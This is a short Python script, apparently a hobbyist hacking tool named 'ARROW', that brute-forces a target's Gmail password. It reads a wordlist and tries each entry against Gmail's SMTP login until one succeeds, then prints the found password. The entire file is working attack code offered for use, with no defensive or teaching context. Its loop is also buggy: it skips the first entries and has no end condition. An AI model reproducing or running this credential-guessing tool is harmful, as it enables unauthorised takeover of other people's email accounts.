import smtplib
yeet = 1
print('\\\___________\'')
print('///************/')
print('ARROW)))----------->')
print('')
filec = input('enter file path: ')
uname = input('enter target email: ')
while 1 == 1:
	with open(filec) as f:
 	   passlist = [line.strip() for line in f]
	yeet = (yeet + 1)
	pword = (passlist[yeet])
	print(uname)
	print(pword)
	try:
		mail = smtplib.SMTP('smtp.gmail.com:587')
		mail.ehlo()
		mail.starttls()
		mail.ehlo()
		mail.login(uname, pword)
	except smtplib.SMTPAuthenticationError:
		print('incorrect pass')
	else:
		break
print('PASSWORD	FOUND!!!')
print(uname)
print(pword)

